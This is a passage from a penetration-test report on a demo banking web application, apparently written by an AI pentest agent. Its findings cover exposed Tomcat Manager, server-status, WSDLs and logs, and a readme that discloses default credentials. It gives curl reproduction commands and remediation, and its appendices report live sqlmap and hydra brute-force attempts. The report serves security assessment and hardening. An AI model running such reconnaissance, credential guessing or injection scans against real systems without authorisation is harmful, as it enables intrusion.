```http
Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, PATCH
```

**One-line proof:** `curl -s -X OPTIONS -i http://zero.webappsecurity.com/ | grep Allow` → `Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, PATCH`.

**Reproduction:** `curl -s -X OPTIONS -i http://zero.webappsecurity.com/ | grep -i allow`

**Impact:** Enables Cross-Site Tracing (XST) where TRACE is fully enabled on the SSL listener (nmap confirmed TRACE allowed on port 443); PUT/DELETE create a future file-manipulation risk if the connector's write protection is removed.

**Recommendation (structural):**
- Configure Tomcat `DefaultServlet` `readonly=true` and `listings=false`; restrict accepted methods to GET/HEAD/POST/PUT (only where needed) via `<security-constraint>` in `web.xml` or an interceptor.
- Disable TRACE on Apache (`TraceEnable off`) and Tomcat (`allowTrace=false` on the Connector).
- Add a DAST gate (Nikto "Allowed HTTP Methods" plugin) that fails when PUT/DELETE/TRACE appear in the `Allow` header.

---

### MED-04 — Exposed Tomcat Manager Application & `/server-status` & `/docs/`

| Field | Value |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-200 (Information Exposure), CWE-16 (Configuration) |
| **WSTG** | WSTG-CONF-02, WSTG-CONF-05 |
| **ASVS v4** | V14.1.3 |
| **Endpoints** | `GET /manager/html` (401 Basic realm "Tomcat Manager Application"), `GET /server-status` (200, mod_status), `GET /docs/` (200, Tomcat 7.0.70 docs index) |
| **Auth required** | None |

**Description**
The Tomcat Manager webapp is reachable from the Internet (returns 401 with `WWW-Authenticate: Basic realm="Tomcat Manager Application"`). `/server-status` exposes live worker state, request counts, and the server banner `Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8t mod_jk/1.2.37`. `/docs/` exposes the full Tomcat 7.0.70 documentation index.

**PoC — Timestamp:** 2026-08-02T23:03:17Z (nikto) / 2026-08-03T00:04:42Z

**PoC — Request:**
```http
GET /manager/html HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (header):**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

`/server-status` excerpt:
```html
<h1>Apache Status</h1>
<dl><dt>Server Version: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8t mod_jk/1.2.37</dt>
    <dt>Server Built: Jan 28 2012 11:16:39</dt>
    <dt>Current Time: Friday, 18-Jan-2013 14:55:36 GMT</dt>
```

**One-line proof:** `curl -s -i http://zero.webappsecurity.com/manager/html` returns `401` with `WWW-Authenticate: Basic realm="Tomcat Manager Application"`; `curl -s http://zero.webappsecurity.com/server-status` returns the Apache status page with version banners.

**Reproduction:** `curl -s -i http://zero.webappsecurity.com/manager/html`; `curl -s http://zero.webappsecurity.com/server-status | head -8`

**Impact:** Manager is a known brute-force target; a single weak credential grants WAR deployment and remote code execution. `/server-status` leaks version banners (enabling CVE targeting) and live request URIs (which may contain session tokens in query strings).

**Recommendation (structural):**
- Uninstall or firewall the Manager webapp from public access (bind to `127.0.0.1` or a management network only).
- Disable `mod_status` (`/server-status`) and `/docs/` in production Tomcat (`RemoteAddrValve` with `allow=127\.0\.0\.1`).
- Add a DAST gate that fails when `/manager/html`, `/server-status`, or `/docs/` return any 2xx/401 from an external IP.

---

### MED-05 — Unauthenticated SOAP Endpoint Enumeration + WSDL Disclosure

| Field | Value |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-200 (Information Exposure), CWE-284 (Improper Access Control) |
| **WSTG** | WSTG-INPV-04 (SOAP Services), WSTG-ATHZ-01 |
| **ASVS v4** | V14.4.1 |
| **Endpoints** | `GET /web-services` (CXF service list), `GET /web-services/infoService?wsdl`, `GET /web-services/secureInfoService?wsdl` |
| **Auth required** | None |

**Description**
The CXF service registry at `/web-services` lists two SOAP services (`InfoService`, `SecureInfoService`) and their full operation catalogue, with WSDLs publicly downloadable. Operations include `findAllUsers`, `searchForUsers`, `getAccountById`, `closeAccount`, `transferFunds`, `addAccount`, `addUser`, `downloadStatementByName` — i.e., the entire banking API surface is enumerable by an unauthenticated attacker.

**PoC — Timestamp:** 2026-08-02T23:55Z

**PoC — Request:**
```http
GET /web-services HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (excerpt):**
```html
<span class="heading">Available SOAP services:</span>
<table>
  <tr><td><span class="porttypename">InfoService</span>
    <ul>
      <li>searchForUsers</li><li>getAccountById</li><li>closeAccount</li>
      <li>findTransactionsByAccount</li><li>isUserEnabled</li>
      <li>transferFunds</li><li>searchForTransactions</li>
      <li>findAccountsByUser</li><li>findAllUsers</li><li>addAccount</li>
      <li>findStatementsByAccountAndYear</li><li>addUser</li>
      <li>downloadStatementByName</li>
    </ul></td>
    <td>Endpoint: http://zero.webappsecurity.com/web-services/infoService
        WSDL: http://zero.webappsecurity.com/web-services/infoService?wsdl
        Target namespace: http://www.hp.com/webinspect/zerows</td>
  </tr>
  ...
</table>
```

**One-line proof:** `curl -s http://zero.webappsecurity.com/web-services | grep -E 'porttypename|WSDL'` enumerates both services and their WSDLs without authentication.

**Reproduction:** `curl -s http://zero.webappsecurity.com/web-services/infoService?wsdl | head -20`

**Impact:** Accelerated attack reconnaissance; the WSDL exposes full type schemas (`userInfo` with `ssn`, `accountInfo` with `cardNumber`, `balance`) which attackers use to craft exploits for SQLi/XPathi/XXE in SOAP parameters.

**Recommendation (structural):**
- Move the CXF service list (`/web-services`) behind authentication or remove it entirely in production; set `CXFServlet` `service-list-sidebar=false` and `hide-service-list=true`.
- Enforce WS-Security (UsernameToken + HTTPS) on `SecureInfoService`; gate the plain `InfoService` behind the same.
- Add a DAST gate that fails when `/web-services` or `?wsdl` returns 200 without authentication.

---

### LOW-01 — Missing Security Headers

| Field | Value |
|---|---|
| **Severity** | Low |
| **CVSS v3.1** | 3.7 — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-693 (Protection Mechanism Failure) |
| **WSTG** | WSTG-CONF-07 (HTTP Security Headers) |
| **ASVS v4** | V14.5.1–V14.5.7 |
| **Endpoint** | All responses |

**Description**
The application omits: `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`. Combined with the XSS findings, the absence of CSP removes a defence-in-depth layer.

**PoC — Timestamp:** 2026-08-02T23:03:17Z (nikto)

**PoC — Verbatim `nikto` output (excerpt):**
```
+ [013587] /: Suggested security header missing: content-security-policy.
+ [013587] /: Suggested security header missing: x-content-type-options.
+ [013587] /: Suggested security header missing: strict-transport-security.
+ [013587] /: Suggested security header missing: referrer-policy.
+ [013587] /: Suggested security header missing: permissions-policy.
```

**One-line proof:** `curl -s -I http://zero.webappsecurity.com/ | grep -iE 'content-security|x-content-type|strict-transport|referrer|permissions'` returns nothing.

**Reproduction:** `curl -s -I http://zero.webappsecurity.com/ | grep -iE 'security|policy|transport|referrer'`

**Impact:** No defence-in-depth against XSS/MIME-sniffing/clickjacking; no HSTS to prevent TLS downgrades (compounds HIGH-05).

**Recommendation (structural):**
- Set a strict CSP (`default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`), `X-Content-Type-Options: nosniff`, `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: geolocation=(), microphone=()`.
- Inject headers at the reverse-proxy layer (Apache `Header always set`) so they apply to every response.
- Add a DAST gate ( Observatory / helmet-check ) that fails when any of these headers is absent.

---

### LOW-02 — Directory Listing on `/errors/` Exposing `errors.log`

| Field | Value |
|---|---|
| **Severity** | Low → Medium (because of the log contents) |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-538 (Insertion of Sensitive Information into Externally Accessible File or Directory), CWE-532 (Insertion of Sensitive Information into Log File) |
| **WSTG** | WSTG-CONF-03, WSTG-ERR-02 |
| **ASVS v4** | V14.1.4, V7.1.1 |
| **Endpoint** | `GET /errors/` (directory listing), `GET /errors/errors.log` (21,684 bytes) |
| **Auth required** | None |

**Description**
`/errors/` returns a Tomcat-generated directory listing containing `errors.log` (21.1 KB). The log records every failed authentication attempt with the **login and password attempted** and the **internal source IP** `10.5.157.10`, and includes internal class names (`com.zero.bank.auth.UserAuthenticator.authenticate(UserAuthenticator.java:51)`).

**PoC — Timestamp:** 2026-08-03T00:04:46Z

**PoC — Request:**
```http
GET /errors/errors.log HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (first 3 lines):**
```
Tue Jan 22 09:11:32 EST 2013 [ERROR] [local 10.5.157.10] [com.zero.bank.auth.UserAuthenticator.authenticate(UserAuthenticator.java:51)] - Not possible to authenticate a user with login [Suspendisse] and password [Nunc].
Tue Jan 22 09:31:20 EST 2013 [ERROR] [local 10.5.157.10] [com.zero.bank.auth.UserAuthenticator.authenticate(UserAuthenticator.java:51)] - Not possible to authenticate a user with login [pede] and password [Donec].
Tue Jan 22 10:49:37 EST 2013 [ERROR] [local 10.5.157.10] [com.zero.bank.auth.UserAuthenticator.authenticate(UserAuthenticator.java:51)] - Not possible to authenticate a user with login [magna.] and password [eget].
```

**One-line proof:** `curl -s http://zero.webappsecurity.com/errors/errors.log | head -1` returns a failed-login log line containing the attempted login, password, and internal IP `10.5.157.10`.

**Reproduction:** `curl -s http://zero.webappsecurity.com/errors/errors.log | head -3`

**Impact:** Credential leakage (failed login attempts are a known source of valid credentials via password reuse), internal IP disclosure (lateral-movement target), user-enumeration, and source-code structure disclosure (`UserAuthenticator.java:51`).

**Recommendation (structural):**
- Set Tomcat `DefaultServlet` `listings=false` and remove `errors.log` from the webroot; logs must live outside the document root.
- Never log credentials (even failed ones). Log only a hashed/normalised username and a correlation ID.
- Add a SAST rule (Fortify "Log Forging" / "Privacy Violation") that fails when `password` appears in a log statement.
- Add a DAST gate that fails when any path under `/errors/` returns 200 or a directory listing.

---

### INFO-01 — `/debug.txt` Discloses Internal Transaction Logs & PII

| Field | Value |
|---|---|
| **Severity** | Info → Low (severity capped because it is a demo artifact; in production this would be High) |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-532, CWE-215 |
| **WSTG** | WSTG-INFO-05, WSTG-ERR-02 |
| **ASVS v4** | V7.1.1, V14.1.4 |
| **Endpoint** | `GET /debug.txt` (27,144 bytes) |
| **Auth required** | None |

**Description**
`/debug.txt` is a DEBUG-level application log left in the webroot. It records every currency exchange, bill payment, and fund transfer with user IDs (e.g., `User 997355147`), account numbers (e.g., `From account: 1164681495`), amounts, currencies, and dates, plus internal class names (`com.zero.bank.currency.CurrencyExchanger.exchangeCurrency(CurrencyExchanger.java:38)`).

**PoC — Timestamp:** 2026-08-02T23:13:26Z

**PoC — Request:**
```http
GET /debug.txt HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (first 6 lines):**
```
Sat Feb 02 11:31:30 EST 2013 [DEBUG] [com.zero.bank.currency.CurrencyExchanger.exchangeCurrency(CurrencyExchanger.java:38)] - User 997355147 is going buy foreign currency.
Sat Feb 02 11:31:30 EST 2013 [DEBUG] [com.zero.bank.currency.CurrencyExchanger.exchangeCurrency(CurrencyExchanger.java:39)] -   Currency ID: CAD
Sat Feb 02 11:31:30 EST 2013 [DEBUG] [com.zero.bank.currency.CurrencyExchanger.exchangeCurrency(CurrencyExchanger.java:40)] -   Amount: 831.80
Sat Feb 02 11:31:30 EST 2013 [DEBUG] [com.zero.bank.currency.CurrencyExchanger.exchangeCurrency(CurrencyExchanger.java:54)] - Transaction is prepared.
Sat Feb 02 11:31:30 EST 2013 [DEBUG] [com.zero.bank.currency.CurrencyExchanger.exchangeCurrency(CurrencyExchanger.java:68)] - Transaction is committed.
Sat Feb 02 11:35:09 EST 2013 [DEBUG] [com.zero.bank.bills.BillsService.payBill(BillsService.java:35)] - User 1879782271 is going pay the payee 718489724
```

**One-line proof:** `curl -s http://zero.webappsecurity.com/debug.txt | head -1` returns a DEBUG log line containing an internal user ID, currency, amount, and the internal Java class name with line number.

**Reproduction:** `curl -s http://zero.webappsecurity.com/debug.txt | head -6`

**Impact:** Disclosure of internal transaction history (user IDs, account numbers, amounts), internal class names, and line numbers — reconnaissance gold for an attacker.

**Recommendation (structural):**
- Never place log files inside the web application's document root; write to a dedicated, access-controlled log volume.
- In production, set the root logger level to `INFO` (or `WARN`) and ensure DEBUG statements are stripped by the build pipeline for production artefacts.
- Add a SAST rule that fails when `user_id`, `account`, or `amount` appears in a DEBUG log message.

---

### INFO-02 — `/readme.txt` Discloses Build & Default-Credential Hints

| Field | Value |
|---|---|
| **Severity** | Info |
| **CVSS v3.1** | 3.1 — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-200 |
| **WSTG** | WSTG-INFO-05 |
| **ASVS v4** | V14.1.3 |
| **Endpoint** | `GET /readme.txt` (1,225 bytes) |
| **Auth required** | None |

**Description**
`/readme.txt` is a developer readme that discloses the platform ("Windows 2000 webserver"), file structure (`confirm.asp`, `colors.inc`, `users.mdb`), and explicitly states "There are two accounts in the database. admin with password admin, and user with password user."

**PoC — Timestamp:** 2026-08-02T23:13:26Z

**PoC — Request:**
```http
GET /readme.txt HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (excerpt):**
```
Version 1.02
More cookie bugs fixed
...
6.  There are two accounts in the database.  admin with password admin, and user with password user.  Admin has admin rights.  I would suggest deleting these two accounts and manually in access setting the admin user by changing the no to yes under admin.
```

**One-line proof:** `curl -s http://zero.webappsecurity.com/readme.txt | grep -i password` returns a line disclosing default credentials `admin/admin` and `user/user`.

**Reproduction:** `curl -s http://zero.webappsecurity.com/readme.txt`

**Impact:** Direct credential disclosure compounding HIGH-01; platform disclosure enables targeted CVE selection.

**Recommendation (structural):**
- Remove all developer readmes, install docs, and sample files from production builds via a build-time exclusion filter.
- Add a CI gate that fails the deployment when any `*.txt`, `README*`, or `*.md` is present in the artefact.
- Rotate any credentials mentioned in the readme and enforce a forced password change on first login.

---

## Remediation & Architecture — Cross-Cutting Recommendations

Beyond the per-finding structural fixes above, the following programme-level controls are required to eliminate the vulnerability *classes* observed:

1. **Mandate framework-level output encoding.** Adopt OWASP Java Encoder (or the templating engine's built-in auto-escaping) everywhere; ban raw string interpolation into HTML / JS / SQL / OS command contexts via a SAST rule (Semgrep, Fortify) that runs as a CI gate. This single control eliminates HIGH-02, HIGH-03, and any future XSS class.
2. **Mandate centralised, allow-list-based access control.** All `/admin/*`, `/bank/*`, and `/web-services/*` routes must declare an explicit role requirement enforced by a single framework interceptor (Spring Security `@PreAuthorize` or a custom `HandlerInterceptor`). Code review must reject any controller lacking an annotation. Eliminates CRIT-01, MED-05.
3. **Mandate centralised, sanitised error handling.** A single `@ControllerAdvice` returns a generic error page to clients; full traces go to the server log only. Eliminates MED-02, HIGH-03.
4. **Mandate credential hygiene.** No plaintext credential storage; adaptive hashing (argon2id); no credentials in logs; forced rotation of all defaults; secret-scan gate in CI. Eliminates CRIT-01, HIGH-01, INFO-02.
5. **Mandate file/path allow-lists.** Any file-include, redirect, or download endpoint must resolve input against a fixed server-side allow-list; reject absolute URLs and `..`. Eliminates CRIT-02, HIGH-04.
6. **Mandate a modern TLS baseline.** TLS 1.2/1.3 only; no RC4/export/CBC; automated cert renewal with 30-day expiry alert; HSTS preload. Eliminates HIGH-05.
7. **Mandate a hardened reverse-proxy configuration.** Apache 2.4.x (or nginx) fronting Tomcat with: security headers injected at the proxy; `TraceEnable off`; `listings=false`; `/server-status`, `/manager`, `/docs/` bound to a management network only; `mod_status` disabled. Eliminates MED-03, MED-04, LOW-01, LOW-02.
8. **Mandate automated security gates in CI/CD.** Every build runs SAST (Fortify/Semgrep), secret-scan (gitleaks), SCA (OWASP Dependency-Check for the EOL Apache/OpenSSL/Tomcat), and DAST (ZAP baseline + the assertion rules above). The build fails on any new finding. This is the single most effective control for preventing regression of every class observed here.

---

## Risk Matrix

| ID | Title | Severity | CVSS | CWE | Endpoint | Remediation Priority |
|---|---|---|---|---|---|---|
| CRIT-01 | Unauthenticated admin panel → plaintext creds/SSNs | Critical | 9.8 | CWE-200/522/312 | `/admin/users.html` | P0 — immediate |
| CRIT-02 | LFI via `help.html?topic=` → `WEB-INF` disclosure | Critical | 9.1 | CWE-22/552 | `/help.html?topic=` | P0 — immediate |
| HIGH-01 | Default credentials accepted | High | 8.6 | CWE-798/521 | `/signin.html` | P0 — immediate |
| HIGH-02 | Reflected XSS in JS context (`accountId` GET) | High | 7.4 | CWE-79 | `/bank/account-activity.html` | P1 |
| HIGH-03 | Reflected XSS via stack-trace page (`accountId` POST) | High | 6.8 | CWE-79/209 | `/bank/account-activity-show-transactions.html` | P1 |
| HIGH-04 | Open redirect via `/bank/redirect.html?url=` | High | 6.1 | CWE-601 | `/bank/redirect.html` | P1 |
| HIGH-05 | EOL TLS (SSLv2/3, expired cert, RC4, export) | High | 8.2 | CWE-327/295/326 | `:443` | P1 |
| MED-01 | Permissive CORS `*` | Medium | 5.3 | CWE-942 | all responses | P2 |
| MED-02 | Verbose Java stack traces (web + SOAP) | Medium | 5.3 | CWE-209/215 | error pages + `/web-services/*` | P2 |
| MED-03 | Permissive HTTP methods (PUT/DELETE/TRACE/PATCH) | Medium | 5.3 | CWE-650 | `OPTIONS /` | P2 |
| MED-04 | Exposed Tomcat Manager / server-status / docs | Medium | 5.3 | CWE-200/16 | `/manager/html`, `/server-status`, `/docs/` | P2 |
| MED-05 | Unauthenticated SOAP service enumeration + WSDL | Medium | 5.3 | CWE-200/284 | `/web-services`, `?wsdl` | P2 |
| LOW-01 | Missing security headers | Low | 3.7 | CWE-693 | all responses | P3 |
| LOW-02 | Directory listing on `/errors/` + `errors.log` | Low→Med | 5.3 | CWE-538/532 | `/errors/errors.log` | P2 |
| INFO-01 | `/debug.txt` transaction log disclosure | Info→Low | 5.3 | CWE-532/215 | `/debug.txt` | P3 |
| INFO-02 | `/readme.txt` default-credential hints | Info | 3.1 | CWE-200 | `/readme.txt` | P3 |

---

## Appendix A — Tool Inventory Used

`curl`, `nmap -sV -sC`, `sslscan`, `nikto`, `whatweb`, `wafw00f`, `gau`, `katana`, `gobuster dir`, `sqlmap` (search / login / find-transactions / show-transactions / accountId), `dalfox`, `hydra` (Tomcat Manager, no credentials recovered). SQLi was not confirmed on any parameter (search returns static "No results"; `accountId` is integer-cast; login is not injectable).

## Appendix B — Endpoints Requiring Authentication (confirmed)

`/bank/account-summary.html`, `/bank/account-activity.html`, `/bank/account-activity-show-transactions.html`, `/bank/account-activity-find-transactions.html`, `/bank/transfer-funds.html`, `/bank/transfer-funds-verify.html`, `/bank/pay-bills.html`, `/bank/money-map.html`, `/bank/online-statements.html`, `/logout.html` — all return 302 to `/login.html` without a valid `JSESSIONID`.

## Appendix C — Notes on Negative Results

- **SQL injection:** sqlmap `--level=3 --risk=2` against `searchTerm`, `user_login`, `description`, `accountId` (GET and POST) — none injectable. `accountId` is `Long.parseLong`-cast (sqlmap reported "possible integer casting detected").
- **Tomcat Manager brute-force:** hydra against `tomcat` with the SecLists 10-million top-500 list returned no valid password within the time budget; default credential pairs (`tomcat/tomcat`, `admin/admin`, etc.) all returned 401.
- **TRACE/XST:** TRACE returns 405 on port 80/8080 but is advertised in `Allow` and was confirmed allowed on the SSL listener by nmap.
- **SSRF via `redirect.html`:** confirmed to be open-redirect only (client-side 302); no server-side fetch of the `url` target was observed.
- **Stored XSS via `/sendFeedback.html`:** the `name` field is HTML-encoded in the "Thank you" response (`&lt;script&gt;`); the `comment` field is not reflected back on `/feedback.html`. No stored XSS confirmed.
- **Reflected XSS via `searchTerm`:** the value is HTML-encoded (`&lt;b&gt;`); dalfox completed with 0 issues.

---

*Report generated 2026-08-03 by GLM-5.2 pentest agent. All PoCs were executed live against the target during the engagement window noted above.*